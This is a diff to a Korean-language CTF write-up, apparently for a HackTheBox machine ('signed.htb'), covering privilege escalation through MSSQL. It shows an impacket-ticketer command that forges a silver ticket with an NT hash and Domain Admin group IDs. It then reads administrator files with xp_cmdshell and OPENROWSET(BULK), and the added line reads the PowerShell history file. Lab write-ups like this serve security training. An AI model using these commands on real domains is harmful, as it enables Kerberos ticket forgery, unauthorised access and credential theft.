@@ -1049,6 +1049,8 @@ KDC에 검증 요청 없이 PAC 내용을 그대로 신뢰
 | 1105~ | 커스텀 그룹 | 도메인마다 다름 (enum_logins로 확인) |
 
 ### 권한 상승
+- `Domains Admins` 그룹으로 속해 있을 경우
+- `OPENROWSET(BULK)`는 서비스 계정으로 읽게 되어서 사용자가 접근하지 못하는 파일에 접근 가능.
 ```bash
 impacket-ticketer -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 -user-id 1103 -groups '512,1105' doesntmatter
 
@@ -1059,6 +1061,7 @@ KRB5CCNAME=doesntmatter.ccache mssqlclient.py -no-pass -k DC01.signed.htb
 xp_cmdshell "type C:\Users\Administrator\Desktop\root.txt"
 
 SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS Contents;
+SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt', SINGLE_CLOB) AS Contents;
 ```
 
 </details>
